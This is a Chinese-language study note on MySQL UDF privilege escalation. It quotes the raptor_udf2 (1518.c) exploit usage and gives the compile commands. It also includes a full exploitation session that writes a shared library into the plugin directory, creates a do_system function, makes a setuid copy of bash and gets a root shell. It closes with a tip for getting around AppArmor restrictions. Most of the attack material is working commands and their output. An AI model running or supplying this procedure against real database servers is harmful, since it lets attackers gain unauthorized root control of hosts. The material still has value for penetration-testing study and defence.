udf，即user-defined Function（用户自定义函数）的缩写，在数据库系统中，用户自定义函数允许用户创建自己的函数，这些函数可以在sql查询中使用，类似于内置函数。通过UDF，用户可以对数据库执行自定义操作，从而满足特定业务需求。
这是mysql本身就有的功能，不是利用，也不用扫描特定的设定

## 提权条件
1.掌握mysql的数据库账户，该账户对mysql拥有增删改查权限，以创建和使用函数。

2.
show variables like '%secure_file_priv%';
secure_file_priv为空，mysql登录后 show variables like '%secure_file_priv%';
secure_file_priv是mysql系统变量，他有两个功能。一是用于控制load data，select ... into outfile和 load_file()等文件操作的范围。二是可以限制这些操作在特定目录下进行，以增强服务器的安全性。
当secure_file_priv设置为一个非空目录路径时，这些操作允许在指定目录下进行。这可以防止潜在的安全漏洞，如未经授权的文件访问或文件写入。
如果secure_file_priv设置为/var/lib/mysql-files/，这意味着文件操作只能在/var/lib/mysql-files/目录下进行，如果secure_file_priv设置为''，那么就存在安全风险。
3.
show variables like '%plugin%'; 
自定义函数将会存在这个目录下，查看plugin的目录是什么，方便后面指定



## 1518.c
参考1518.c

 * Usage:
 * $ id
 * uid=500(raptor) gid=500(raptor) groups=500(raptor)
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * $ mysql -u root -p
 * Enter password:
 * [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 * mysql> \! sh
 * sh-2.05b$ cat /tmp/out
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
 * [...]

## 准备利用文件
```bash
gcc -g -c raptor_udf2.c -fPIC
```
1.  -g ：这个选项会生成调试信息，使得你可以在调试器（如GDB）中调试编译后的程序。生成的调试信息包含源代码行号、局部和全局变量信息等。
2.  -c ：选项指示编译器仅编译源代码，但不进行链接。编译器将生成一个目标文件（object file），通常具有.o 扩展名。这对于将多个源文件分别编译成目标文件，然后链接为一个可执行程序或库很有用。
3.  -fPIC ：这个选项告诉编译器生成位置无关代码（Position-IndependentCode，PIC）。这种代码可以在内存中的任何位置执行，这对于创建共享库（如动态链接库）非常有用，因为它们可以被多个程序在运行时共享。

```bash
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

## 利用过程
```sql
 mysql> use mysql;
 mysql> create table foo(line blob);
 mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
 mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
 mysql> create function do_system returns integer soname 'raptor_udf2.so';
 mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
+------------------------------------------------------------------+
| do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash') |
+------------------------------------------------------------------+
|                                                                0 |
+------------------------------------------------------------------+
1 row in set (0.00 sec)
mysql> exit
Bye
user@debian:~/tools/mysql-udf$ ls /tmp
backup.tar.gz  out  rootbash  useless
user@debian:~/tools/mysql-udf$ /tmp/rootbash
rootbash-4.1$ whoami
user
rootbash-4.1$ exit
exit
user@debian:~/tools/mysql-udf$ /tmp/rootbash -p
rootbash-4.1# 
```


## 说明
1.  show variables like '%plugin%';  不同的数据库版本，这个路径有差别，所以要提权查询，备用。
2. `create table foo(line blob);` 是什么意思: 这个命令是用于创建一个名为 "foo" 的表（table），该表包含一个名为 "line" 的列（column），数据类型为 BLOB。BLOB 表示 "Binary Large Object"，它
可以存储大量的二进制数据，如图像、音频、视频等等。因此，这个命令创建了一个包含一个BLOB 列的表。
3. "foo" 在计算机编程和网络领域中是一个常用的占位符名称。它通常用于表示示例代码或未指定的变量、函数、对象或表。在这个上下文中，我们在创建一个名为 "foo" 的表。"foo" 本身没有特定的意义，它只是一个通用的名字，用于说明如何创建一个表。在实际应用中，您可能会根据您的需求为表选择一个更具描述性的名称。
4.  create function do_system returns integer soname 'raptor_udf2.so';  这项操作，一般是找plugin目录中的.so文件的。
5. 如果dumpfile失败，对于 AppArmor（如果您使用的是基于 Debian 的系统，如 Ubuntu），编辑`/etc/apparmor.d/usr.sbin.mysqld`  文件，找到以下行：`/usr/sbin/mysqld {` ，在此行下方添加以下内容：`/usr/lib/mysql/plugin/** rw,`
6. 删除mysql函数的命令：DROP FUNCTION IF EXISTS do_system;
7. 查询已有udf：SELECT * FROM mysql.func;